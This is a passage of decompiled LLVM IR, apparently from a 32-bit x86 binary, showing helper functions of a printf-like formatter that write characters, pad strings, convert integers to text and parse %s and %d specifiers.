  %v4_80486e1 = add i32 %storemerge11, 1
  %v7_80486ea = icmp sgt i32 %v4_80486e1, %stack_var_-12.0.lcssa
  %v2_80486f2 = sub i32 %v4_80486e1, %stack_var_-16.0
  %v6_80486f4 = add i32 %v2_80486f2, %v4_8048663
  br i1 %v7_80486ea, label %dec_label_pc_80486ec, label %dec_label_pc_80486c9

dec_label_pc_80486ec:                             ; preds = %dec_label_pc_80486c9, %dec_label_pc_80486c1
  %v6_80486f4.lcssa = phi i32 [ %v4_8048663, %dec_label_pc_80486c1 ], [ %v6_80486f4, %dec_label_pc_80486c9 ]
  %v22_80486f4 = inttoptr i32 %v6_80486f4.lcssa to i8*
  store i8 0, i8* %v22_80486f4, align 1
  ret i32 %v6_80486f4.lcssa

; uselistorder directives
  uselistorder i32 %v6_80486f4.lcssa, { 1, 0 }
  uselistorder i32 %v4_80486e1, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.021, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_804867b, { 2, 1, 0 }
  uselistorder i32 %v4_8048663, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 (i32)* @function_8050f5c, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80486c9, { 1, 0 }
  uselistorder label %dec_label_pc_80486c1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80486a9, { 1, 0 }
  uselistorder label %dec_label_pc_8048684, { 1, 0 }
}

define i32 @function_8048700(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048700:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_8048706 = icmp eq i32* %arg1, null
  br i1 %v4_8048706, label %dec_label_pc_8048725, label %dec_label_pc_804870c

dec_label_pc_804870c:                             ; preds = %dec_label_pc_8048700
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_804870f = load i32, i32* %arg1, align 4
  %v3_8048714 = inttoptr i32 %v2_804870f to i8*
  store i8 %tmp8, i8* %v3_8048714, align 1
  %v2_8048719 = load i32, i32* %arg1, align 4
  %v1_804871b = add i32 %v2_8048719, 1
  store i32 %v1_804871b, i32* @edx, align 4
  store i32 %v1_804871b, i32* %arg1, align 4
  br label %dec_label_pc_8048740

dec_label_pc_8048725:                             ; preds = %dec_label_pc_8048700
  %v3_804873b = bitcast i8* %stack_var_8 to i32*
  %v4_804873b = call i32 @function_8050f24(i32 1, i32* %v3_804873b, i32 1)
  br label %dec_label_pc_8048740

dec_label_pc_8048740:                             ; preds = %dec_label_pc_804870c, %dec_label_pc_8048725
  %v0_8048741 = phi i32 [ %tmp5, %dec_label_pc_804870c ], [ %v4_804873b, %dec_label_pc_8048725 ]
  ret i32 %v0_8048741

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048740, { 1, 0 }
}

define i32 @function_8048742(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048742:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_80487a3, label %dec_label_pc_804875c

dec_label_pc_804875c:                             ; preds = %dec_label_pc_8048742
  %v4_8048763 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8048763, i32* @edx, align 4
  %v2_804877445 = load i8, i8* %arg2, align 1
  %v4_804877747 = icmp eq i8 %v2_804877445, 0
  %v1_804877949 = icmp eq i1 %v4_804877747, false
  br i1 %v1_804877949, label %dec_label_pc_804876b, label %dec_label_pc_804877b

dec_label_pc_804876b:                             ; preds = %dec_label_pc_804875c, %dec_label_pc_804876b
  %v4_804877151 = phi i32 [ %v5_804876e, %dec_label_pc_804876b ], [ %v4_8048763, %dec_label_pc_804875c ]
  %stack_var_-12.050 = phi i32 [ %v4_804876b, %dec_label_pc_804876b ], [ 0, %dec_label_pc_804875c ]
  %v4_804876b = add i32 %stack_var_-12.050, 1
  %v5_804876e = add i32 %v4_804877151, 1
  %v22_804876e = inttoptr i32 %v5_804876e to i8*
  store i32 %v5_804876e, i32* @edx, align 4
  %v2_8048774 = load i8, i8* %v22_804876e, align 1
  %v4_8048777 = icmp eq i8 %v2_8048774, 0
  %v1_8048779 = icmp eq i1 %v4_8048777, false
  br i1 %v1_8048779, label %dec_label_pc_804876b, label %dec_label_pc_804877b

dec_label_pc_804877b:                             ; preds = %dec_label_pc_804876b, %dec_label_pc_804875c
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_804875c ], [ %v4_804876b, %dec_label_pc_804876b ]
  %v5_8048781 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_8048781, label %dec_label_pc_804878c, label %dec_label_pc_8048792

dec_label_pc_804878c:                             ; preds = %dec_label_pc_804877b
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_804878f = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_8048792

dec_label_pc_8048792:                             ; preds = %dec_label_pc_804877b, %dec_label_pc_804878c
  %storemerge = phi i32 [ %v5_804878f, %dec_label_pc_804878c ], [ 0, %dec_label_pc_804877b ]
  %v1_8048795 = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_8048795, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_80487a3

dec_label_pc_80487a3:                             ; preds = %dec_label_pc_8048792, %dec_label_pc_8048742
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_8048742 ], [ %storemerge, %dec_label_pc_8048792 ]
  %stack_var_-16.0 = phi i32 [ 32, %dec_label_pc_8048742 ], [ %tmp15, %dec_label_pc_8048792 ]
  %v1_80487a6 = urem i32 %arg4, 2
  %v2_80487a6 = icmp eq i32 %v1_80487a6, 0
  %v1_80487ab = icmp eq i1 %v2_80487a6, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_80487ab, label %dec_label_pc_80487ed.preheader, label %dec_label_pc_80487c7.preheader

dec_label_pc_80487c7.preheader:                   ; preds = %dec_label_pc_80487a3
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_80487af, label %dec_label_pc_80487ed.preheader

dec_label_pc_80487af:                             ; preds = %dec_label_pc_80487c7.preheader, %dec_label_pc_80487af
  %stack_var_-20.041 = phi i32 [ %v4_80487c1, %dec_label_pc_80487af ], [ 0, %dec_label_pc_80487c7.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_80487c4, %dec_label_pc_80487af ], [ %stack_var_12.0, %dec_label_pc_80487c7.preheader ]
  %v3_80487bc = call i32 @function_8048700(i32* %.pre, i32 %stack_var_-16.0)
  %v4_80487c1 = add i32 %stack_var_-20.041, 1
  %v4_80487c4 = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_80487c4, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_80487af, label %dec_label_pc_80487ed.preheader

dec_label_pc_80487ed.preheader:                   ; preds = %dec_label_pc_80487c7.preheader, %dec_label_pc_80487af, %dec_label_pc_80487a3
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_80487a3 ], [ %stack_var_12.0, %dec_label_pc_80487c7.preheader ], [ %v4_80487c4, %dec_label_pc_80487af ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_80487a3 ], [ 0, %dec_label_pc_80487c7.preheader ], [ %v4_80487c1, %dec_label_pc_80487af ]
  %v4_80487ed26 = ptrtoint i8* %arg2 to i32
  %v2_80487f027 = load i8, i8* %arg2, align 1
  %v4_80487f329 = icmp eq i8 %v2_80487f027, 0
  %v1_80487f531 = icmp eq i1 %v4_80487f329, false
  br i1 %v1_80487f531, label %dec_label_pc_80487cf, label %dec_label_pc_8048811.preheader

dec_label_pc_80487cf:                             ; preds = %dec_label_pc_80487ed.preheader, %dec_label_pc_80487cf
  %v4_80487ed34 = phi i32 [ %v5_80487ea, %dec_label_pc_80487cf ], [ %v4_80487ed26, %dec_label_pc_80487ed.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_80487e7, %dec_label_pc_80487cf ], [ %stack_var_-20.1.ph, %dec_label_pc_80487ed.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_80487ea, %dec_label_pc_80487cf ], [ %arg2, %dec_label_pc_80487ed.preheader ]
  %v2_80487d2 = load i8, i8* %stack_var_8.032, align 1
  %v3_80487d2 = zext i8 %v2_80487d2 to i32
  %v3_80487e2 = call i32 @function_8048700(i32* %.pre, i32 %v3_80487d2)
  %v4_80487e7 = add i32 %stack_var_-20.133, 1
  %v5_80487ea = add i32 %v4_80487ed34, 1
  %v22_80487ea = inttoptr i32 %v5_80487ea to i8*
  %v2_80487f0 = load i8, i8* %v22_80487ea, align 1
  %v4_80487f3 = icmp eq i8 %v2_80487f0, 0
  %v1_80487f5 = icmp eq i1 %v4_80487f3, false
  br i1 %v1_80487f5, label %dec_label_pc_80487cf, label %dec_label_pc_8048811.preheader

dec_label_pc_8048811.preheader:                   ; preds = %dec_label_pc_80487cf, %dec_label_pc_80487ed.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80487ed.preheader ], [ %v4_80487e7, %dec_label_pc_80487cf ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_80487f9, label %dec_label_pc_8048817

dec_label_pc_80487f9:                             ; preds = %dec_label_pc_8048811.preheader, %dec_label_pc_80487f9
  %stack_var_-20.225 = phi i32 [ %v4_804880b, %dec_label_pc_80487f9 ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048811.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_804880e, %dec_label_pc_80487f9 ], [ %stack_var_12.2.ph, %dec_label_pc_8048811.preheader ]
  %v3_8048806 = call i32 @function_8048700(i32* %.pre, i32 %stack_var_-16.0)
  %v4_804880b = add i32 %stack_var_-20.225, 1
  %v4_804880e = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_804880e, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_80487f9, label %dec_label_pc_8048817

dec_label_pc_8048817:                             ; preds = %dec_label_pc_80487f9, %dec_label_pc_8048811.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048811.preheader ], [ %v4_804880b, %dec_label_pc_80487f9 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_804880e, { 1, 0 }
  uselistorder i8* %v22_80487ea, { 1, 0 }
  uselistorder i32 %v5_80487ea, { 1, 0 }
  uselistorder i32 %v4_80487c4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_804876e, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_80487f9, { 1, 0 }
  uselistorder label %dec_label_pc_80487cf, { 1, 0 }
  uselistorder label %dec_label_pc_80487ed.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80487af, { 1, 0 }
  uselistorder label %dec_label_pc_8048792, { 1, 0 }
  uselistorder label %dec_label_pc_804876b, { 1, 0 }
}

define i32 @function_804881c(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_804881c:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048830 = trunc i64 %arg2 to i32
  %v5_8048836 = icmp eq i32 %v4_8048830, 0
  %v6_8048836 = icmp slt i32 %v4_8048830, 0
  %v1_804883a = icmp eq i1 %v5_8048836, false
  br i1 %v1_804883a, label %dec_label_pc_804886c, label %dec_label_pc_804883c

dec_label_pc_804883c:                             ; preds = %dec_label_pc_804881c
  store i32 48, i32* %stack_var_-16, align 4
  %tmp40 = bitcast i32* %stack_var_-16 to i8*
  %v6_804885f = call i32 @function_8048742(i32 %arg1, i8* %tmp40, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_8048956

dec_label_pc_804886c:                             ; preds = %dec_label_pc_804881c
  %v4_804886c = icmp eq i32 %arg4, 0
  br i1 %v4_804886c, label %dec_label_pc_804888d, label %dec_label_pc_8048872

dec_label_pc_8048872:                             ; preds = %dec_label_pc_804886c
  %v13_8048872 = icmp eq i32 %arg3, 10
  %v1_8048876 = icmp eq i1 %v13_8048872, false
  br i1 %v1_8048876, label %dec_label_pc_804888d, label %dec_label_pc_8048878

dec_label_pc_8048878:                             ; preds = %dec_label_pc_8048872
  %v1_804887c = icmp eq i1 %v6_8048836, false
  br i1 %v1_804887c, label %dec_label_pc_804888d, label %dec_label_pc_804887e

dec_label_pc_804887e:                             ; preds = %dec_label_pc_8048878
  %v1_8048888 = sub i32 0, %v4_8048830
  %v5_804888a = sext i32 %v1_8048888 to i64
  br label %dec_label_pc_804888d

dec_label_pc_804888d:                             ; preds = %dec_label_pc_8048878, %dec_label_pc_8048872, %dec_label_pc_804886c, %dec_label_pc_804887e
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_804886c ], [ %arg2, %dec_label_pc_8048872 ], [ %arg2, %dec_label_pc_8048878 ], [ %v5_804888a, %dec_label_pc_804887e ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_804886c ], [ 0, %dec_label_pc_8048872 ], [ 0, %dec_label_pc_8048878 ], [ 1, %dec_label_pc_804887e ]
  %tmp41 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp41, align 4
  %v4_80488ee6 = trunc i64 %stack_var_-24.0 to i32
  %v5_80488ee7 = icmp eq i32 %v4_80488ee6, 0
  %v1_80488f214 = icmp eq i1 %v5_80488ee7, false
  br i1 %v1_80488f214, label %dec_label_pc_804889e.lr.ph, label %dec_label_pc_80488f4

dec_label_pc_804889e.lr.ph:                       ; preds = %dec_label_pc_804888d
  %v5_80488a1 = sext i32 %arg3 to i64
  br label %dec_label_pc_804889e

dec_label_pc_804889e:                             ; preds = %dec_label_pc_804889e.lr.ph, %dec_label_pc_80488c6
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_804889e.lr.ph ], [ %v5_80488eb, %dec_label_pc_80488c6 ]
  %stack_var_-40.015 = phi i8* [ %tmp41, %dec_label_pc_804889e.lr.ph ], [ %v22_80488c6, %dec_label_pc_80488c6 ]
  %v6_80488ac = and i64 %stack_var_-24.116, 4294967295
  %v12_80488ac = udiv i64 %v6_80488ac, %v5_80488a1
  %v13_80488ac = trunc i64 %v12_80488ac to i32
  %v14_80488ac = urem i64 %v6_80488ac, %v5_80488a1
  %v5_80488b1 = trunc i64 %v14_80488ac to i8
  %v7_80488b8 = icmp sgt i8 %v5_80488b1, 9
  br i1 %v7_80488b8, label %dec_label_pc_80488ba, label %dec_label_pc_80488c6

dec_label_pc_80488ba:                             ; preds = %dec_label_pc_804889e
  %tmp = trunc i64 %v14_80488ac to i32
  %v5_80488bd = add i32 %tmp, %arg7
  %v1_80488c0 = add i32 %v5_80488bd, 198
  %v11_80488c0 = trunc i32 %v1_80488c0 to i8
  br label %dec_label_pc_80488c6

dec_label_pc_80488c6:                             ; preds = %dec_label_pc_804889e, %dec_label_pc_80488ba
  %stack_var_-36.0 = phi i8 [ %v11_80488c0, %dec_label_pc_80488ba ], [ %v5_80488b1, %dec_label_pc_804889e ]
  %v4_80488c6 = ptrtoint i8* %stack_var_-40.015 to i32
  %v5_80488c6 = add i32 %v4_80488c6, -1
  %v22_80488c6 = inttoptr i32 %v5_80488c6 to i8*
  %v2_80488cd = add i8 %stack_var_-36.0, 48
  store i8 %v2_80488cd, i8* %v22_80488c6, align 1
  %v5_80488eb = sext i32 %v13_80488ac to i64
  %v5_80488ee = icmp eq i32 %v13_80488ac, 0
  %v1_80488f2 = icmp eq i1 %v5_80488ee, false
  br i1 %v1_80488f2, label %dec_label_pc_804889e, label %dec_label_pc_80488f4

dec_label_pc_80488f4:                             ; preds = %dec_label_pc_80488c6, %dec_label_pc_804888d
  %stack_var_-40.0.lcssa = phi i8* [ %tmp41, %dec_label_pc_804888d ], [ %v22_80488c6, %dec_label_pc_80488c6 ]
  %v4_80488f4 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_80488f4, label %dec_label_pc_804892e, label %dec_label_pc_80488fa

dec_label_pc_80488fa:                             ; preds = %dec_label_pc_80488f4
  %v4_80488fa = icmp eq i32 %arg5, 0
  br i1 %v4_80488fa, label %dec_label_pc_8048925, label %dec_label_pc_8048900

dec_label_pc_8048900:                             ; preds = %dec_label_pc_80488fa
  %v1_8048903 = and i32 %arg6, 2
  %v2_8048903 = icmp eq i32 %v1_8048903, 0
  br i1 %v2_8048903, label %dec_label_pc_8048925, label %dec_label_pc_804890a

dec_label_pc_804890a:                             ; preds = %dec_label_pc_8048900
  %v3_8048918 = inttoptr i32 %arg1 to i32*
  %v4_8048918 = call i32 @function_8048700(i32* %v3_8048918, i32 45)
  %v4_8048920 = add i32 %arg5, -1
  br label %dec_label_pc_804892e

dec_label_pc_8048925:                             ; preds = %dec_label_pc_8048900, %dec_label_pc_80488fa
  %v4_8048925 = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_8048925 = add i32 %v4_8048925, -1
  %v22_8048925 = inttoptr i32 %v5_8048925 to i8*
  store i8 45, i8* %v22_8048925, align 1
  br label %dec_label_pc_804892e

dec_label_pc_804892e:                             ; preds = %dec_label_pc_80488f4, %dec_label_pc_804890a, %dec_label_pc_8048925
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_80488f4 ], [ %arg5, %dec_label_pc_8048925 ], [ %v4_8048920, %dec_label_pc_804890a ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_80488f4 ], [ %v22_8048925, %dec_label_pc_8048925 ], [ %stack_var_-40.0.lcssa, %dec_label_pc_804890a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80488f4 ], [ 0, %dec_label_pc_8048925 ], [ 1, %dec_label_pc_804890a ]
  %v6_8048949 = call i32 @function_8048742(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_8048951 = add i32 %v6_8048949, %stack_var_-28.0
  store i32 %v2_8048951, i32* @edx, align 4
  br label %dec_label_pc_8048956

dec_label_pc_8048956:                             ; preds = %dec_label_pc_804883c, %dec_label_pc_804892e
  %storemerge = phi i32 [ %v2_8048951, %dec_label_pc_804892e ], [ %v6_804885f, %dec_label_pc_804883c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_80488c6, { 0, 2, 1 }
  uselistorder i8 %v5_80488b1, { 1, 0 }
  uselistorder i64 %v6_80488ac, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048956, { 1, 0 }
  uselistorder label %dec_label_pc_804892e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80488c6, { 1, 0 }
  uselistorder label %dec_label_pc_804889e, { 1, 0 }
  uselistorder label %dec_label_pc_804888d, { 3, 0, 1, 2 }
}

define i32 @function_804895b(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804895b:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804895b = load i32, i32* @ebp, align 4
  store i32 %v0_804895b, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.454 = inttoptr i32 %arg2 to i8*
  %v2_8048c0f55 = load i8, i8* %stack_var_8.454, align 1
  %v4_8048c1257 = icmp eq i8 %v2_8048c0f55, 0
  %v1_8048c1459 = icmp eq i1 %v4_8048c1257, false
  br i1 %v1_8048c1459, label %dec_label_pc_804896d, label %dec_label_pc_8048c1a

dec_label_pc_804896d:                             ; preds = %dec_label_pc_804895b, %dec_label_pc_8048c09
  %stack_var_8.463 = phi i8* [ %stack_var_8.4, %dec_label_pc_8048c09 ], [ %stack_var_8.454, %dec_label_pc_804895b ]
  %stack_var_-28.162 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8048c09 ], [ 0, %dec_label_pc_804895b ]
  %stack_var_12.161 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048c09 ], [ %arg3, %dec_label_pc_804895b ]
  %stack_var_8.4.in60 = phi i32 [ %v5_8048c09, %dec_label_pc_8048c09 ], [ %arg2, %dec_label_pc_804895b ]
  %v2_8048970 = load i8, i8* %stack_var_8.463, align 1
  %v10_8048973 = icmp eq i8 %v2_8048970, 37
  %v1_8048975 = icmp eq i1 %v10_8048973, false
  br i1 %v1_8048975, label %dec_label_pc_8048bee, label %dec_label_pc_804897b

dec_label_pc_804897b:                             ; preds = %dec_label_pc_804896d
  %v5_804897b = add i32 %stack_var_8.4.in60, 1
  %v22_804897b = inttoptr i32 %v5_804897b to i8*
  %v2_804898e = load i8, i8* %v22_804897b, align 1
  %v4_8048991 = icmp eq i8 %v2_804898e, 0
  br i1 %v4_8048991, label %dec_label_pc_8048c1a, label %dec_label_pc_8048999

dec_label_pc_8048999:                             ; preds = %dec_label_pc_804897b
  %v2_804899c = load i8, i8* %v22_804897b, align 1
  %v10_804899f = icmp eq i8 %v2_804899c, 37
  br i1 %v10_804899f, label %dec_label_pc_8048bee, label %dec_label_pc_80489a7

dec_label_pc_80489a7:                             ; preds = %dec_label_pc_8048999
  %v2_80489aa = load i8, i8* %v22_804897b, align 1
  %v10_80489ad = icmp eq i8 %v2_80489aa, 45
  %v1_80489af = icmp eq i1 %v10_80489ad, false
  br i1 %v1_80489af, label %dec_label_pc_80489c4.preheader, label %dec_label_pc_80489b1

dec_label_pc_80489b1:                             ; preds = %dec_label_pc_80489a7
  %v5_80489b1 = add i32 %stack_var_8.4.in60, 2
  %v22_80489b1 = inttoptr i32 %v5_80489b1 to i8*
  br label %dec_label_pc_80489c4.preheader

dec_label_pc_80489c4.preheader:                   ; preds = %dec_label_pc_80489b1, %dec_label_pc_80489a7
  %stack_var_8.0.ph = phi i8* [ %v22_804897b, %dec_label_pc_80489a7 ], [ %v22_80489b1, %dec_label_pc_80489b1 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80489a7 ], [ 1, %dec_label_pc_80489b1 ]
  %v4_80489c422 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_80489c723 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_80489ca29 = icmp eq i8 %v2_80489c723, 48
  br i1 %v7_80489ca29, label %dec_label_pc_80489bd, label %dec_label_pc_80489f3.preheader

dec_label_pc_80489bd:                             ; preds = %dec_label_pc_80489c4.preheader, %dec_label_pc_80489bd
  %v4_80489c432 = phi i32 [ %v5_80489bd, %dec_label_pc_80489bd ], [ %v4_80489c422, %dec_label_pc_80489c4.preheader ]
  %stack_var_-32.031 = phi i32 [ %v4_80489c0, %dec_label_pc_80489bd ], [ %stack_var_-32.0.ph, %dec_label_pc_80489c4.preheader ]
  %v5_80489bd = add i32 %v4_80489c432, 1
  %v22_80489bd = inttoptr i32 %v5_80489bd to i8*
  %v4_80489c0 = or i32 %stack_var_-32.031, 2
  %v2_80489c7 = load i8, i8* %v22_80489bd, align 1
  %v7_80489ca = icmp eq i8 %v2_80489c7, 48
  br i1 %v7_80489ca, label %dec_label_pc_80489bd, label %dec_label_pc_80489f3.preheader

dec_label_pc_80489f3.preheader:                   ; preds = %dec_label_pc_80489bd, %dec_label_pc_80489c4.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_80489c4.preheader ], [ %v22_80489bd, %dec_label_pc_80489bd ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_80489c4.preheader ], [ %v4_80489c0, %dec_label_pc_80489bd ]
  %v4_80489f334 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  %v2_80489f635 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %tmp = icmp ult i8 %v2_80489f635, 48
  br i1 %tmp, label %dec_label_pc_8048a07, label %dec_label_pc_80489fd

dec_label_pc_80489d0:                             ; preds = %dec_label_pc_80489fd
  %v2_80489d9 = mul i32 %stack_var_-36.046, 10
  %v2_80489e1 = load i8, i8* %stack_var_8.145, align 1
  %v3_80489e1 = zext i8 %v2_80489e1 to i32
  %v5_80489e7 = add i32 %v2_80489d9, -48
  %v1_80489ea = add i32 %v5_80489e7, %v3_80489e1
  %v5_80489f0 = add i32 %v4_80489f347, 1
  %v22_80489f0 = inttoptr i32 %v5_80489f0 to i8*
  %v2_80489f6 = load i8, i8* %v22_80489f0, align 1
  %tmp70 = icmp ult i8 %v2_80489f6, 48
  br i1 %tmp70, label %dec_label_pc_8048a07, label %dec_label_pc_80489fd

dec_label_pc_80489fd:                             ; preds = %dec_label_pc_80489f3.preheader, %dec_label_pc_80489d0
  %v4_80489f347 = phi i32 [ %v5_80489f0, %dec_label_pc_80489d0 ], [ %v4_80489f334, %dec_label_pc_80489f3.preheader ]
  %stack_var_-36.046 = phi i32 [ %v1_80489ea, %dec_label_pc_80489d0 ], [ 0, %dec_label_pc_80489f3.preheader ]
  %stack_var_8.145 = phi i8* [ %v22_80489f0, %dec_label_pc_80489d0 ], [ %stack_var_8.0.lcssa, %dec_label_pc_80489f3.preheader ]
  %v2_8048a00 = load i8, i8* %stack_var_8.145, align 1
  %tmp71 = icmp ult i8 %v2_8048a00, 58
  br i1 %tmp71, label %dec_label_pc_80489d0, label %dec_label_pc_8048a07

dec_label_pc_8048a07:                             ; preds = %dec_label_pc_80489d0, %dec_label_pc_80489fd, %dec_label_pc_80489f3.preheader
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_80489f3.preheader ], [ %stack_var_8.145, %dec_label_pc_80489fd ], [ %v22_80489f0, %dec_label_pc_80489d0 ]
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_80489f3.preheader ], [ %stack_var_-36.046, %dec_label_pc_80489fd ], [ %v1_80489ea, %dec_label_pc_80489d0 ]
  %v2_8048a0a = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048a0d = icmp eq i8 %v2_8048a0a, 115
  %v1_8048a0f = icmp eq i1 %v10_8048a0d, false
  br i1 %v1_8048a0f, label %dec_label_pc_8048a5e, label %dec_label_pc_8048a11

dec_label_pc_8048a11:                             ; preds = %dec_label_pc_8048a07
  %v1_8048a14 = add i32 %stack_var_12.161, 4
  %v1_8048a1c = inttoptr i32 %stack_var_12.161 to i32*
  %v2_8048a1c = load i32, i32* %v1_8048a1c, align 4
  %v4_8048a21 = icmp eq i32 %v2_8048a1c, 0
  br i1 %v4_8048a21, label %dec_label_pc_8048a36, label %dec_label_pc_8048a27

dec_label_pc_8048a27:                             ; preds = %dec_label_pc_8048a11
  %v5_8048a2a = inttoptr i32 %v2_8048a1c to i8*
  br label %dec_label_pc_8048a36

dec_label_pc_8048a36:                             ; preds = %dec_label_pc_8048a11, %dec_label_pc_8048a27
  %storemerge = phi i8* [ %v5_8048a2a, %dec_label_pc_8048a27 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a598.24, i32 0, i32 0), %dec_label_pc_8048a11 ]
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v6_8048a51 = call i32 @function_8048742(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_8048a56 = add i32 %v6_8048a51, %stack_var_-28.162
  br label %dec_label_pc_8048c09

dec_label_pc_8048a5e:                             ; preds = %dec_label_pc_8048a07
  %v2_8048a61 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048a64 = icmp eq i8 %v2_8048a61, 100
  %v1_8048a66 = icmp eq i1 %v10_8048a64, false
  br i1 %v1_8048a66, label %dec_label_pc_8048ab2, label %dec_label_pc_8048a68

dec_label_pc_8048a68:                             ; preds = %dec_label_pc_8048a5e
  %v1_8048a6b = add i32 %stack_var_12.161, 4
  %v1_8048a73 = inttoptr i32 %stack_var_12.161 to i32*
  %v2_8048a73 = load i32, i32* %v1_8048a73, align 4
  store i32 %stack_var_-36.0.lcssa, i32* @edx, align 4
  %v8_8048aa5 = sext i32 %v2_8048a73 to i64
  %v9_8048aa5 = call i32 @function_804881c(i32 %tmp6, i64 %v8_8048aa5, i32 10, i32 1, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048aaa = add i32 %v9_8048aa5, %stack_var_-28.162
  br label %dec_label_pc_8048c09

dec_label_pc_8048ab2:                             ; preds = %dec_label_pc_8048a5e
  %v2_8048ab5 = load i8, i8* %stack_var_8.1.lcssa, align 1
